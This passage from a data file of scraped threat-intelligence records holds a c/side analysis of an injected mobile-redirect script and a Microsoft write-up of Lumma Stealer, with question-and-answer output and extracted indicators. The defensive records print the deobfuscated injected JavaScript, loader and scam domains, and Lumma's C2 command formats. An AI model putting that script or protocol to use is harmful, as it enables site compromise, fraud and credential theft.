:\n\n```\n$('#htmlContenthtml').html(x(\"uhkV3gCCBQyiiK\\u002bNG9JE\\u002b9hHSIODkYZ1ut5A6t6ZN1CzUGIQV0q\\u002bDif4omYaPwky489u93Bg0A3mGPnKRNpagzetPGDoU\\u002bqgg9XIwBFbNm0peuBVpJNWUyEo9A9jMb1ww\\/lJPCvSd7udl39atb6SGz7uyslJZ9dasE\\/vd\\u002bHndr\\u002bcaWLMw1gWIixKSIgpVmONGvK6CsRol9Y1q00W1XLRuBVoaGY2IKqMcfJJGpGwBtUQMLaxY5XZIrVLu10GdxWMXBMyvnghS\\/EdP6hJtLE\\/mfoGAf8zerXqTEKiTvTDKfG7CC7icpdf81fSEKdeh8AfSrHR48S1AagUWx0R6m5MFsm8BGTlJIzMUHzp9KJ\\u002bI8Mnop9cH14cOgn2ogrgjDcmTH03ing4oZ\\u002bWBiQlDGjMJAIEgYILMURWJrJBh\\/OSYaiIcH0BaDem3\\/cZ052IkV61YJFeyZqYEkIEd156Mednuct8dZ840FTbhhLlE43O0BpNKgQYCTKuC5HNXAQMihQXRwT1\\u002bQidCflMlPdqiWbnNg5aFKTqF3Sp99OwGCGzzTOb55f\\u002bmkHhqf4Lkx5JocptlF3RqE2LU8IAs9cxAGJeFOd\\/\\/iV89tqUPrEm6gZ9BUIcXDNmA39xIpn1gd2xnptU4GicPWmPhYgcwaZZqWKZdwcdDX\\/a8l7JFiziVHrbjHq0D\\/zLRH6DG2Cae6VPjbSsDBVnSwGV1eyi2xtEBEIjw3crQvNxDlEXPMAye16PvdqtoQSlhWbCuaehEOIzYpThGA6ar8elsWNA25IPOD2q08fb1XDkVY9WwgQhAStzAVi4Nkmr\\u002b19472m27SXwFgQG\\u002bL9qIvldGETi2MTAg7I4pTFiNdhCG7JrHVnjVLqWerIEs2Tfg6wc2Viw0jmIQHli0m79BvuN46pk\\/kpNz8gbABrFb4pLA1FSXH\\/bNG4KLt9O64bYUPAd7wTUv3Q47k1PmXTSwhTH\\/wcFZagKEjoeE9M\\/79a\\u002bDIzPe5LnwBKxs\\/DkktiZ9r0NokvYXutby9z2WjmjToVmDv03iD5O3wAF\\/22sAzgtvVMAunEAy8nvDiuGRC5kko\\u002bbjZrWiq6cMmCe6EhCcM3mSdHxj8pVy7\\u002b5HLkDxqDMLBktDP1kdcMlwLlH9CIF6jzAuIF4WSEvaMAQXUHSgUJjyopdP1ApAaOgJBdb6rHxHrFYXsK8CscgkPCKb\\u002bLoDyK\\/X3MAA2TbqFPlEwCZv6YdtUEvabj\\u002bUpFjxSfbqXnmKzebamYKrRiVkv\\u002bOEYAa\\u002barOSCx2e2M6sBjF5CpEuP9BWhs2f3kcQXtrf9OA\\/jb69Vg6vl7U6kI\\/PK92JQDHQsbMANMkICDTqU39Rv9TlRJU\\u002bTerkvwUkJ\\u002bcUeYr8C7HreKG6mIkneW2Dg6T\\u002bDh792jOWjhKY\\u002bgdov\\/5cRJSRrk9Qn9f9n1BDvMzX\\u002b\\/qjuxUKz7pb7Jn9tuddc7HpsKV\\/mvYHTYu\\/hdqd7BtkowWidNN26gXWUbi3wKIXMGjzEI5LvjBIZQe7RB2oIEoWt5GxxLJXfo4LDQLWWhVPIgL5O0O7JBx51wWYCC\\/35AhdojHKz\\/W9k\\/WkCgCiQ8bRbV5cnOfuHt\\u002bEKLKZPTUdhveHlSVQxhiqx5P0\\/y7NitzNHn17pfZtdtg9EeA8NNDdM50pGqzcY9Gq6UxzF5mvb\\u002bKFPNIFhaPqSxU2bwk\\u002bJxHyCX9PhmN8NoJao2sFgwrTMsPzXbpGGXk4moDOsO\\/gEGIcv\\/Lan5sOh1Sdk\\u002bbBN0J4Et4bDzkcKqsRXd68TsRF\\/4QL18N4mwdAeBzIgIr9oKSVN587pUEQ8cMWmMF1gO8oPsfHf2OxlyOq1ynp16QCDGVm7l46fzLCzTOg3sWIPWwmG9aVVTKD\\/Rb5hIgJAb9nzF4dR8IXuJNgCsSswOPcDPmBS9cUoCCEfqtbQxHbwsV46r8ER28ZfzG9O31Z\\/67FEmE4\\u002bKS2\\/nmHhS7C7LbhwfhEBhphphDngH9qjh1UdYU\\/9eWGAdPRFnUJZPuUaPqb7W19ZJEigC9C9hhNZ\\/lN3n2X2D\\/mIsOLkr1S37gyrgTIheSGauTKf4JXwpu\\/R9fHcO07uys7fQ6EAFVq6lTwDmNu3dX6RHlzY2f86vREVgYNIfOxgc\\u002bZjqiFa0lyk3gV63G5NC\\u002bfQmseG8ja9rAAQ\\u002bvzzShhHtud4fVdAvPAafGCiGOi3vQQN7eHlFvkSKk08xkUdyApOzDyEp4VifnWEasTdRG2EtFd0\\u002bteLPsnn\\/Ws2RGEUhmo\\u002bH0NCvybejA5SZH2xSyXCI6vzCXvEdXxVI5r4F811zdkG3dQXnJzyRTtz18EOpWOjWiCwIo\\u002beK76g85y1AxsfvClDs1hHV1Fc452TbYnLIzB\\/8D9BivBY0xJr3AEj9lpT8yMOY5aB0XvYcPAEnirKmILBYMH653DQ43Hz\\/FkZjiFQzuNRUvD4FeBTLClcF4TI1abk7fFk1PdRbNdF18IXcudo7nus0oPM\\u002bJmORxzD3jpYfBxxS2pG\\/kIcZoalbFXyKZtE245MYCJdO9DoSRwLxTZ06lAjXQYxzht2CabUKVR7LnPN1UHduG9m7RxHCGX3EBQftz6nrlSfSn25VAknMD\\/odK1WLR35OEV5HZA2OYUMJvNddB5Bn1UlEAtojd38xrNnja\\u002bArC82AVJW7SZRlEKGYqn8zahGjEk9Dl7duhzPqkb\\/x9\\u002bBPuhCSNR6x5iuV0BOltS3KDAhIHWgcr\\/XRQpiT7D6anVoberQm6gdz8sYAcw06Z7p2rhuL8HQmk5tZCRDJ2e6Gd91pGSn38fQvmTXkNC3mAqbH\\u002b63HBtF9CnG76U6MX3qOhHxW3eLBur9WmlWJ0hAej4p5r3LBxJ2W8bTk322bB6n48WYgYOU4H0Xr\\/QKZlbp0a10iOViF\\/joR8n0CF5MDJr4JCAm4HSt7oVksigTAePh3hRt\\u002b3Xoq0Znm3Ze46XvPr3JPZ9cUNpB\\u002bjVSWztX41j0fzBCowNTAMDFYMv7QJTFfISU5daCT2PJ4bjwEd7s8dbL4GkiZzsHjeU1Y27pYuZ5WcW\\u002bIWeuX1NXRaFSOT4spx\\/FijUaA4g5jRR6Qmx55m5Mf2vOUJ9itjVMqfGGtb\\/UyvvoizfN\\u002bVNpdPRSUlB17cXotygSPIFpki4\\/Yr53w8CvmIyKNsg7i0yt2nnuhP59k70WUTmR5e2Or8HCRkX7y6H2pm0IZkD2vmJFvTbLCkb4cjRU2SM28gWFmoelBucFfbiDxKkPYMvJjJSTkg6WiGtd8hdF82og0\\u002bXvxAjKwuDb23btRE\\/kKFDgllFg==\",\"encryptedDatastr\",\"eIyX1RkLJ4dnkjWpsfuAWA==\"));\n```\n\nThis code decrypts to:\n\n```\n<style type=\"text/css\">\n@media screen and (min-width:800px){.yl5{display:none;}}.yl5{width:100%;overflow:auto;background:#33343f;}.yl5 dd{float:left;width:20%;white-space:nowrap;overflow:hidden;padding:0;line-height:32px;margin-inline-start:0px;margin-bottom:0rem;}.yl5 dd li{line-height:30px;height:30px;overflow:hidden;text-align:center;border:1px solid #e5e5e5;background:#33343f;border-radius:1px;list-style:none;}.yl5 dd li a{font-size:18px;color:#f9ff00;}</style>\n<div class=\"yl5\">\n\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/yn2k0ypd\"><strong>视频I区</strong></a></li></dd>\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/r42r7opq\"><strong>视频E区</strong></a></li></dd>\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/mqp10w2x\"><strong>视频J区</strong></a></li></dd>\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/z32x7npd\"><strong>视频D区</strong></a></li></dd>\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/1dpy76pv\"><strong>视频P区</strong></a></li></dd>\n\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/oq5dd058\"><strong>视频F区</strong></a></li></dd>\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/q5o9gx5w\"><strong>视频Q区</strong></a></li></dd>\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/l50dx72e\"><strong>视频S区</strong></a></li></dd>\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/32xdq1pd\"><strong>视频W区</strong></a></li></dd>\n<dd><li><a rel=\"external nofollow noopener\" target=\"_blank\" href=\"https://www.akav50.top/list/92qlr9pn\"><strong>视频Y区</strong></a></li></dd>\n\n<div class=\"mebty\"><table border=\"1\" width=\"100%\" class=\"duilianpt\" bgcolor=\"#ffffff\" cellspacing=\"0\" bordercolor=\"#FFFFFF\" bordercolorlight=\"#FFFFFF\" bordercolordark=\"#FFFFFF\" cellpadding=\"4\" style=\"text-align:center; background-color: #33343f;font-size: 16px;\"><tbody><tr><td style=\"background-color: #33343f;\"><a style=\"color: red;\">AV VIP温馨提示:因运营商网络问题，若网站打不开，akav01.top-akav60.top总有一个能打开!</a></td></tr></tbody></table></div></div>\n```\n\n## The injection flow\n\nThe attack starts with websites being injected with the following script:\n\n```\njavascript\nCopyEdit\nhxxps://xxsmad6[.]com/s.php?g=1&t=2&p=1388&i=\n```\n\n- This script acts as the initial loader.\n- When the victim visits a compromised website from a mobile device, it triggers the redirect.\n- Visits from non-mobile devices (desktop, server crawlers) are ignored, reducing detection.\n\nWe’re observing significant traffic to this domain, indicating a widespread campaign.\n\n## The payload script (deobfuscated)\n\nHere's a breakdown of the main injected code:\n\n```\n(function () {\n  let flag = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);\n  if(!flag){ return false; }\n\n  // Ensure viewport for mobile rendering\n  var gmate = document.getElementsByTagName('meta'), isviewport = 1;\n  for(var i=0,len=gmate.length; i<len; i++){\n    if(gmate[i] && gmate[i].getAttribute('name') == 'viewport'){ isviewport = 0; }\n  }\n  if(isviewport){\n    var node = document.createElement('meta');\n    node.content = 'width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no';\n    node.name = 'viewport';\n    document.getElementsByTagName('head')[0].insertBefore(node, head.firstChild);\n  }\n\n  // Fallback for missing body\n  if(!document.body){\n    document.write(\"<a id='_nobody' style='display: none'>none</a>\");\n  }\n\n  var arand = Math.floor(Math.random() * 100000);\n\n  var o = \"<div id='\"+arand+\"' style='width:100%;background-color: rgba(0,0,0,.64);box-shadow: 0 -1px 1px rgba(0,0,0,.10);'>\" +\n            \"<div style='position: relative;'>\" +\n              \"<a href='https://xxsmad6.com' target='_blank'>\" +\n                \"<img style='position: absolute;bottom: 0;left:0;display: none;' src='hxxps://xxsmad6[.]com/static/union/images/b-5.png'>\" +\n              \"</a>\" +\n              \"<img id='i\"+arand+\"' style='width: 100%;display: block;' src='hxxps://p3-sign.toutiaoimg[.]com/...' >\" +\n              \"<img src='hxxps://xxsmad6[.]com/static/union/images/close.png' id='c\"+arand+\"' style='position:absolute;top:0;right:0;cursor:pointer;width:26px;height:26px;z-index:2147483647'>\" +\n            \"</div>\" +\n          \"</div>\";\n  document.write(o);\n\n  document.getElementById(\"c\"+arand).onclick = function() {\n    window.open((\"hxxps://xjdm166[.]com/html/?p=1388\"), \"_blank\");\n  };\n  document.getElementById(\"i\"+arand).onclick = function() {\n    window.open((\"hxxps://xjdm166[.]com/html/?p=1388\"), \"_blank\");\n  };\n})();\n```\n\nExample of an adult content website\n\nDuring the analysis we found some glitches in these web applications, using those we were able to find some hidden frames.\n\nHow the Ho ti website looks normally:\n\nUncompromized view of the website\n\nWebsite with glitches of frames:\n\nGlitch reveals hidden frames\n\nThe injected URLs lead to adult fake adult websites trying to show it as well-know adult websites:\n\nFake redirect page\n\nIt leads to a download for Android and Apple malware:\n\nFake iOS\n\nWe have managed to get 2 samples detected by just 3 vendors over VirustTotal.\n\n- Only 3 out of 63 detected\n- Only 3 out of 65 detected\n\n## Mitigation &amp; recommendations:\n\n- Review and sanitize third-party scripts. Focus on external inclusions you don’t control.\n- Implement strict CSP (Content Security Policy) to reduce inline script execution.\n- Monitor your website’s runtime behavior with a client-side security solution (shameless plug: c/side can help with that).\n- Be vigilant for any unexpected new meta tags, overlays, or external requests to domains you don’t recognize.\n\n## c/side Newsletter\n\nSubscribe to our newsletter to get the latest updates.\n\nSubscribe\n\n## Contents\n\n- 1. What’s happening:\n- 2. PWAs attacks are on the rise\n- 3. Compromised websites: disguised as novel reading platforms\n- 4. The injection flow\n- 5. The payload script (deobfuscated)\n- 6. Mitigation &amp; recommendations:\n\n## Related Content\n\n# Chinese Adult Content Scam Targets Mobile Users Through PWA Injection\n\nWe’ve identified a fresh injection campaign abusing third-party JavaScript to redirect mobile users to a Chinese adult-content PWA scam.\n\n# FAQ\n\nPCI Compliance &amp; Regulations\n\n\n\n\nDoes c/side satisfy PCI DSS 4.0.1 controls 6.4.3 and 11.6.1?\n\nYes. VikingCloud’s independent assessment confirms that, when properly configured, both the (hybrid) proxy and crawler modes fulfil these requirements by continuously hashing, analysing, and, if necessary, blocking scripts in real‑time.\n\nRead our VikingCloud assessment here.\n\n\n\n\nHow exactly does c/side meet PCI?\n\nThe (hybrid) proxy hashes and analyses every script on every page‑load, while the crawler\n\n# Malicious North Korean actors attempt to infiltrate technology companies\n\nCatching fraudulent job applicants.\n\n# Client-Side Attack Recap – Q1 2025\n\nc/side’s research uncovered nearly 300,000 compromised websites in Q1 of 2025.\n\nH\n\n## More About Himanshu Anand\n\nI'm a software engineer and security analyst at c/side.\n\nMonitoring, Securing, Optimizing 3rd Party Scripts\n\nBook a demo\n\nContact Sales\n\nPCI DSS v4.0.1 SAQ-D\n\nContributing to\n\nProduct\n\n- Home\n- Pricing\n- PCI DSS\n- Job Portal Protection\n\nCompare\n\n- Overview\n- Page Shield\n- Akamai\n- Jscrambler\n- Imperva\n- Feroot\n- Human Security\n\nResources\n\n- Documentation\n- Blog\n- Changelog\n- Security\n- Domain Directory\n- News\n- Glossary\n\nCompany\n\n- About\n- Contact\n- Partners\n- Careers\n- Merch\n\nPrivacy Policy\n\nCookie Notice\n\nTerms and Conditions\n\n© 2025 Client-side Development, Inc.\n\nStatus:\n\nLoading status..."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "Lumma Stealer is an infostealer malware, specifically a malware as a service (MaaS) offering.", "question": "What kind of malware is it?"}, {"answer": "Lumma Stealer involves various types of attacks, including phishing, malvertising, drive-by downloads, and abuse of legitimate services, to steal sensitive information such as browser credentials, cryptocurrency wallets, and other user data.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, Lumma Stealer extracts saved passwords, session cookies, and autofill data from browsers, including Chromium, Mozilla, and Gecko-based browsers.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, Lumma Stealer is capable of installing other malware or plugins, including coin miners, and it targets data from various browser extensions.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, Lumma Stealer is capable of stealing various types of data, including browser credentials and cookies, cryptocurrency wallets, and other sensitive information, but it does not specifically target credit cards or bank information. However, it can steal data from various applications, including VPNs, email clients, and FTP clients.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, Lumma Stealer is related to wallet stealer, as it targets and steals data from cryptocurrency wallets and browser extensions associated with wallets like MetaMask, Electrum, and Exodus.", "question": "Is it related to wallet stealer?"}, {"answer": "Lumma Stealer steals various types of user data, including browser credentials and cookies, cryptocurrency wallets and extensions, data from VPNs, email clients, and FTP clients, as well as user documents and system metadata.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is forwarded to the Lumma Stealer's command-and-control (C2) infrastructure, which is hidden behind Cloudflare proxy.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations include organizations in Canada, and the malware targets various applications and data such as browsers, cryptocurrency wallets (e.g. MetaMask, Electrum, and Exodus), VPNs, email clients, and Telegram applications.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "check.foquh[.]icu"}, {"type": "Domain or URL", "value": "data-seed-prebsc-1-s1.bnbchain[.]org"}, {"type": "Domain or URL", "value": "binadata[.]com"}, {"type": "IP Address", "value": "185.147.125.174"}], "keywords_found": ["analysis", "threat", "fraud", "intelligence", "wallet", "apt", "infostealers", "phishing", "cybercrime", "malicious", "passwords", "cryptocurrency", "dropper", "browser"], "article_textual_content": "Lumma Stealer: Breaking down the delivery techniques and capabilities of a prolific infostealer | Microsoft Security BlogShareTagsCredential theftStormContent typesResearchProducts and servicesMicrosoft DefenderMicrosoft Defender for EndpointMicrosoft Defender for Office 365Microsoft Defender XDRMicrosoft security expertsTopicsThreat intelligenceOver the past year, Microsoft observed the persistent growth and operational sophistication of Lumma Stealer, an infostealer malware used by multiple financially motivated threat actors to target various industries. Our investigation into Lumma Stealer’s distribution infrastructure reveals a dynamic and resilient ecosystem that spans phishing, malvertising, abuse of trusted platforms, and traffic distribution systems. These findings underscore the importance of collaborative efforts to disrupt cybercrime. Microsoft, partnering with others across industry and international law enforcement, recently facilitated adisruption of Lumma infrastructure.Lumma Stealer (also known as LummaC2) is a malware as a service (MaaS) offering that is capable of stealing data from various browsers and applications such as cryptocurrency wallets and installing other malware. Microsoft Threat Intelligence tracks the threat actor who developed and maintains the Lumma malware, command-and-control (C2) infrastructure, and the Lumma MaaS as Storm-2477. Affiliates who pay Storm-2477 for the service and operate their own Lumma campaigns access a panel to build the malware binary and manage the C2 communications and stolen information. We have observed ransomware threat actors like Octo Tempest, Storm-1607, Storm-1113, and Storm-1674 using Lumma Stealer in campaigns.Unlike earlier infostealers that relied heavily on bulk spam or exploits, Lumma Stealer exemplifies a shift toward multi-vector delivery strategies. Its operators demonstrate resourcefulness and proficiency in impersonation tactics. The Lumma Stealer distribution infrastructure is flexible and adaptable. Operators continually refine their techniques, rotating malicious domains, exploiting ad networks, and leveraging legitimate cloud services to evade detection and maintain operational continuity. This dynamic structure enables operators to maximize the success of campaigns while complicating efforts to trace or dismantle their activities.The growth and resilience of Lumma Stealer highlights the broader evolution of cybercrime and underscores the need for layered defenses and industry collaboration to counter threats. In this blog post, we share our analysis of Lumma Stealer and its infrastructure and provide guidance on how users and organizations can protect themselves from this threat. Microsoft remains committed to sharing insights, developing protections, and working with partners across industries to disrupt malicious ecosystems and safeguard users worldwide.Figure 1. Heat map detailing global spread of Lumma Stealer malware infections and encounters across Windows devices.Lumma Stealer delivery techniquesLumma Stealer leverages a broad and evolving set of delivery vectors. Campaigns often combine multiple techniques, dynamically adapting to evade detection and increase infection success rates. Delivery infrastructure is designed to be ephemeral, shifting rapidly across domains, platforms, and geographies to avoid takedowns.Phishing emails: Lumma Stealer emails impersonate known brands and services to deliver links or attachments. These campaigns involve expertly crafted emails designed to evoke urgency, often masquerading as urgent hotel reservation confirmations or pending cancellations. The emails lead victims to cloned websites or malicious servers that deploy the Lumma payload to the targets’ environment.Malvertising: Threat actors inject fake advertisements into search engine results, targeting software-related queries such as “Notepad++ download” or “Chrome update.” Clicking these poisoned links leads users to cloned websites that closely mimic legitimate vendors but instead deliver the Lumma Stealer.Drive-by download on compromised websites: Threat actors were observed compromising groups of legitimate websites, typically through a particular vulnerability or misconfiguration. They modify site content by inserting malicious JavaScript. The JavaScript runs when sites are visited by unsuspecting users, leading to delivery of a payload, intermediary script, or displaying further lures to convince users to perform an action.Trojanized applications: In many campaigns, cracked or pirated versions of legitimate applications are bundled with Lumma binaries and distributed through file-sharing platforms. These modified installers often contain no visible payload during installation, executing the malware silently post-launch.Abuse of legitimate services and ClickFix: Public repositories like GitHub are abused and populated with scripts and binaries, often disguised as tools or utilities. A particularly deceptive method involves fake CAPTCHA pages, commonly observed in the ClickFix ecosystem. Targets are instructed to copy malicious commands into their system’sRunutility under the pretense of passing a verification check. These commands often download and execute Lumma directly in memory, using Base64 encoding and stealthy delivery chains.Dropped by other malware: Microsoft Threat Intelligence observed other loaders and malware such as DanaBot delivering Lumma Stealer as an additional payload.All these mechanisms reflect threat actor behavior that prioritizes abuse of user trust, manipulation of legitimate infrastructure, and multi-layered distribution chains designed to evade both technical and human defenses. The following sections discuss some examples of campaigns where the mentioned distribution methods were used to deliver Lumma Stealer.Drive-by download campaign leveraging EtherHiding and ClickFix to deliver LummaIn early April 2025, Microsoft observed a cluster of compromised websites leveraging EtherHiding and ClickFix techniques to install Lumma Stealer. EtherHiding is a technique that involves leveraging smart contracts on blockchain platforms like Binance Smart Chain (BSC) to host parts of malicious code. Traditional methods of blocking malicious code, such as IP or domain blocking or content-based detections, are less effective against EtherHiding because the code is embedded in the blockchain. Meanwhile, in the ClickFix technique, a threat actor attempts to take advantage of human problem-solving tendencies by displaying fake error messages or prompts that instruct target users to fix issues by copying, pasting, and launching commands that eventually result in the download of malware.Figure 2. Attack flow for ClickFix to Lumma StealerIn this campaign, the JavaScript injected into compromised websites directly contacted BSC to retrieve the ClickFix code and lure, which was then presented to the target. Users needed to click the “I’m not a robot” prompt, at which point a command was copied into their clipboard. Users were then instructed to paste and launch this command via the WindowsRunprompt. The command downloaded and initiated further code usingmshtafromcheck.foquh[.]icu.Figure 3. Compromised website used EtherHiding and ClickFix techniques to present a fake CAPTCHA lure to visitorsFigure 4. Snippet of the injected JavaScript after Base64 decoding. It implements the EtherHiding technique and communicates with data-seed-prebsc-1-s1.bnbchain[.]org to fetch ClickFix code.Figure 5. This fake verification page is the final part of the ClickFix technique. It instructs users how to launch a malicious command. The command was silently copied into their clipboard during the previous step when they clicked “I’m not a robot”.Email campaign targeting organizations in Canada to deliver Lumma StealerOn April 7, 2025, Microsoft Threat Intelligence observed an email campaign consisting of thousands of emails targeting organizations in Canada. The emails used invoice lures for a fitness plan or an online education platform. The emails’ subject lines were personalized to include recipient-specific details such as “Invoice for [recipient email]”. Notably, the attack chain utilized multiple tools available for purchase on underground forums for traffic filtering and social engineering.The emails contained URLs leading to thePrometheus traffic direction system (TDS)hosted on numerous compromised sites. The TDS in turn, redirected users to the attacker-controlled websitebinadata[.]comthat hosted the ClickFix social engineering framework. Like the previous campaign, targets were instructed to click a “I’m not a robot” prompt and run malicious code via a multi-step process. The malicious code was anmshtacommand that downloaded and executed JavaScript from the IP address 185.147.125[.]174. The JavaScript ran a PowerShell command that downloaded more PowerShell code, which finally downloaded and launched a Lumma Stealer executable. Notably, Xworm malware was also bundled into this executable.Figure 6. Attack flow for ClickFix leading to Lumma Stealer targeting users in CanadaFigure 7. Fitness plan subscription themed email lureFigure 8. Screenshot of the ClickFix landing after Prometheus TDS redirectionLumma Stealer malware analysisThe core Lumma Stealer malware is written in a combination of C++ and ASM. The malware author designed it as a MaaS offering. Threat actors can access the panel to build the malware binary and manage the C2 communications and stolen information. The core binary is obfuscated with advanced protection such as low-level virtual machine (LLVM core), Control Flow Flattening (CFF), Control Flow Obfuscation, customized stack decryption, huge stack variables, and dead codes, among others. These techniques are implemented on the critical functions to make static analysis difficult, as these can cause tools like Hex-Rays’ IDA fail to produce equivalent decompiled codes. In addition, most of the critical APIs are implemented via low-level syscalls and Heavens Gate Technology.Lumma Stealer is designed to steal from browsers based on Chromium and Mozilla technology, including Microsoft Edge. In addition, it has the capability to install other malware or plugins, including Clipboard stealer plugin and coin miners, either by downloading to disk or directly in memory.Process injection and process hollowingLumma loader may use process hollowing to inject its malicious payload into legitimate system processes likemsbuild.exe,regasm.exe,regsvcs.exe, andexplorer.exe. This technique enables execution under the guise of a trusted binary to bypass behavioral detection and endpoint monitoring tools.Information-stealing capabilitiesLumma Stealer targets a comprehensive set of user data using a specialized collection routine for each type of data. These capabilities have evolved over time, and Microsoft Threat Intelligence has recently observed that the instructions for the target credentials are specified in the configuration file retrieved from the active C2 server. The configuration file is divided into several parts: the “ex” section that pertains to the target list of apps for cryptocurrency wallets and extensions, and “c” sections that pertain to the list of applications and configuration details for browsers, user file’s locations, and other applications.Browser credentials and cookies:Lumma Stealer extracts saved passwords, session cookies, and autofill data from Chromium (including Edge), Mozilla, and Gecko-based browsers.Cryptocurrency wallets and extensions:Lumma Stealer actively searches for wallet files, browser extensions, and local keys associated with wallets like MetaMask, Electrum, and Exodus.Various applications:Lumma Stealer targets data from various virtual private networks (VPNs) (.ovpn), email clients, FTP clients, and Telegram applications.User documents:Lumma Stealer harvests files found on the user profiles and other common directories, especially those with .pdf, .docx, or .rtfextensions.System metadata:Lumma Stealer collects host telemetry such as CPU information, OS version, system locale, and installed applications for tailoring future exploits or profiling victims.Figure 9. Lumma Stealer configuration fileC2 communicationLumma Stealer maintains a robust C2 infrastructure, using a combination of hardcoded tier 1 C2s that are regularly updated and reordered, and fallback C2s hosted as Steam profiles and Telegram channels that also point to the tier 1 C2s. The Telegram C2, if available, is always checked first, while the Steam C2 is checked only when all the hardcoded C2s are not active. To further hide the real C2 servers, all the C2 servers are hidden behind the Cloudflare proxy.While Lumma Stealer affiliates share the tier 1 C2s, there is a capability to add a personal tier 1 C2 domain for an extra cost. The diagram below shows an overview of the Lumma Stealer infrastructure. All traffic is encrypted by HTTPS.Figure 10. Lumma Stealer C2 communicationDifferent types of obfuscation are applied to each set of C2 servers. For example, the hardcoded list of C2s, and including the Telegram fallback C2 URL are protected with ChaCha20 crypto, while the Steam profile fallback C2 URL is encrypted using custom stack-based crypto algorithm that can change on each version of Lumma malware.We have identified up to six versions of Lumma Stealer, and while each of these versions focuses on improving techniques to evade antivirus detections, there are also several changes in the C2 communication protocol and formats such as the C2 domains, URI path, POST data, and others. The core Lumma malware stores the build date as part of the embedded configuration to keep track of improvements, but in our investigation, we tracked major changes using the labels “version 1” through “version 6”.Lumma Stealer keeps track of the active C2 for sending the succeeding commands. Each command is sent to a single C2 domain that is active at that point. In addition, each C2 command contains one or more C2 parameters specified as part of the POST data as form data. The parameters are:act:Indicates the C2 command. Note: This C2 parameter no longer exists in Lumma version 6.ver:Indicates C2 protocol version. This value is always set to 4.0 and has never changed since the first version Lumma.lid(for version 5 and below)/uid(for version 6): This ID identifies the Lumma client/operator and its campaign.j(for version 5 and below )/cid(for version 6): This is an optional field that identifies additional Lumma features.hwid: Indicates the unique identifier for the victim machine.pid: Used in SEND_MESSAGE command to identify the source of the stolen data. A value of 1, indicates it came from the Lumma core process.The following are some of the most common Lumma Stealer C2 commands and associated parameters:PING / LIFE: Initial command to check if the C2 is active. Note: This command does not exist in version 6.act=lifeRECEIVE_MESSAGE: Command to download the stealer’s configuration. As noted above, this contains the specifications on the list of targets.version 3 and below:act=recive_message&ver=4.0&lid=[<lid_value>]&j=[<j_value>]version 4 and 5:act=receive_message&ver=4.0&lid=[<lid_value>]&j=[<j_value>]version 6:uid=<uid_value>&cid=[<cid_value>]SEND_MESSAGE: Command to send back stolen data in chunks. The C2 parameters are specified as individual section in the whole POST data. The fields included areact=send_message,hwid,pid,lid/uid, andj/cid. Theactfield was removed in version 6.GET_MESSAGE: Command to download the second configuration. This configuration contains information about the plugins and additional malware to install on the target systems. We have observed that in most cases this command will respond with valid but empty records “[]”, meaning nothing to download. So far, we have observed Lumma Stealer installing an updated version of the Clipboard stealer plugin and coin miners.versions 5 and below:act=get_message&ver=4.0&lid=[<lid_value>]&j=[<j_value>]&hwid=<hwid_value>version 6:uid=<uid_value>&cid=[<cid_value>]&hwid=<hwid_value>Microsoft Digital Crimes Unit (DCU) engineered tools that identify and map the Lumma Stealer C2 infrastructure. As part of the disruption announced on May 21, Microsoft’s DCU has facilitated the takedown, suspension, and blocking of approximately 2,300 malicious domains that formed the backbone of the Lumma Stealer infrastructure.  More details of this operation are presented in theDCU disruption announcement.RecommendationsMicrosoft Threat Intelligence recommends the following mitigations to reduce the impact of this threat.Strengthen Microsoft Defender for Endpoint configurationEnsure thattamper protectionis enabled in Microsoft Defender for Endpoint.Enablenetwork protectionin Microsoft Defender for Endpoint.Turn onweb protection.Runendpoint detection and response (EDR) in block modeso that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach.Configureinvestigation and remediationin full automated mode to let Microsoft Defender for Endpoint take immediate action on alerts to resolve breaches, significantly reducing alert volume.Microsoft Defender XDR customers can turn on the followingattack surface reduction rulesto prevent common attack techniques used by threat actors.Blockexecutable files from running unless they meet a prevalence, age, or trusted list criterionBlockexecution of potentially obfuscated scriptsBlockJavaScript or VBScript from launching downloaded executable contentBlockprocess creations originating from PSExec and WMI commandsBlockcredential stealing from the Windows local security authority subsystemBlockuse of copied or impersonated system toolsStrengthen operating environment configurationRequiremultifactor 